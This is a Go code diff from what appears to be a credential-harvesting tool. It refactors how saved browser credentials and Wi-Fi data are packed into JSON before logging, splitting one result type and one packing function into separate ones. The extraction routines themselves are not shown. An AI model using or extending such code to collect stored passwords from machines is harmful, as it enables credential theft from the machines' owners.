@@ -9,13 +9,24 @@ import (
 	"strings"
 )
 
-type SuccessResult struct {
+type SuccessCredentialsResult struct {
 	App string
 	Data []common.CredentialsData
 }
 
-func packData(result common.ExtractDataResult, name string) []byte{
-	var dataForMarshal = SuccessResult{name, result.Data}
+type SuccessWifiResult struct {
+	App string
+	Data []common.WifiData
+}
+
+func packBrowsersData(result common.ExtractCredentialsResult, name string) []byte{
+	var dataForMarshal = SuccessCredentialsResult{name, result.Data}
+	var returning, _ = json.Marshal(dataForMarshal)
+	return returning
+}
+
+func packWifiData(result common.ExtractWifiData, name string) []byte{
+	var dataForMarshal = SuccessWifiResult{name, result.Data}
 	var returning, _ = json.Marshal(dataForMarshal)
 	return returning
 }
@@ -33,13 +44,13 @@ func main() {
 		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
 	}
 
-	var BrowsersData = common.ExtractDataResult{false, common.RemoveDuplicates(AllBrowsersData)}
-	var data = packData(BrowsersData, "browsers")
+	var BrowsersData = common.ExtractCredentialsResult{false, common.RemoveDuplicates(AllBrowsersData)}
+	var data = packBrowsersData(BrowsersData, "browsers")
 	AllData = append(AllData, string(data))
 
 	var resultWifi = wifi.WifiExtractDataRun()
 	if resultWifi.Success{
-		var data = packData(resultWifi, "wifi")
+		var data = packWifiData(resultWifi, "wifi")
 		AllData = append(AllData, string(data))
 	}
 	log.Println("["+strings.Join(AllData, ",")+"]")
